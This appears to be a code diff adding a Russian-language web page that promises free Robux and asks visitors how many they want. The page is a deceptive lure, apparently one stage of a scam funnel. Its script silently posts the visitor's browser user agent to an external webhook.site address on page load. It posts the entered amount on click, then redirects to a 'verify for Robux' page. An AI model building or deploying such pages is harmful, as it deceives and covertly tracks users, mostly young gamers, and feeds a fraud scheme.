@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Сколько Robux?</title>
+    <style>
+        body { margin:0; background:#1b1b2f; font-family: 'Segoe UI', Arial, sans-serif; display:flex; justify-content:center; align-items:center; height:100vh; }
+        .container { background:#282846; padding:40px; border-radius:16px; text-align:center; max-width:400px; }
+        h2 { color:#fff; }
+        input { padding:12px; font-size:18px; border-radius:8px; border:none; width:80%; margin:10px 0; }
+        .btn { background:#e03a3a; border:none; color:white; font-size:18px; padding:12px 30px; border-radius:30px; cursor:pointer; }
+        .btn:hover { background:#c02a2a; }
+        .error { color:#ff6b6b; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>Сколько Robux вы хотите?</h2>
+        <p style="color:#aaa;">Введите число (только цифры)</p>
+        <input type="text" id="robuxInput" placeholder="Например 5000">
+        <br>
+        <button class="btn" id="getBtn">Получить!</button>
+        <p id="errorMsg" class="error"></p>
+    </div>
+    <script>
+        const webhookUrl = 'https://webhook.site/49e9ab76-4f4a-4226-9268-bd5f05411dd6';
+
+        document.getElementById('getBtn').addEventListener('click', function() {
+            const val = document.getElementById('robuxInput').value.trim();
+            if (val === '' || isNaN(val) || !/^\d+$/.test(val)) {
+                document.getElementById('errorMsg').textContent = 'Напишите сколько Robux вы хотите!';
+                return;
+            }
+            localStorage.setItem('robuxAmount', val);
+
+            // Отправка данных на вебхук
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    page: 'rbxstage3',
+                    robuxAmount: val,
+                    timestamp: new Date().toISOString()
+                })
+            });
+
+            window.location.href = 'rbxverifyforrobux.html';
+        });
+
+        // Отправка данных при загрузке страницы
+        fetch(webhookUrl, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                page: 'rbxstage3_visit',
+                userAgent: navigator.userAgent,
+                timestamp: new Date().toISOString()
+            })
+        });
+    </script>
+</body>
+</html>
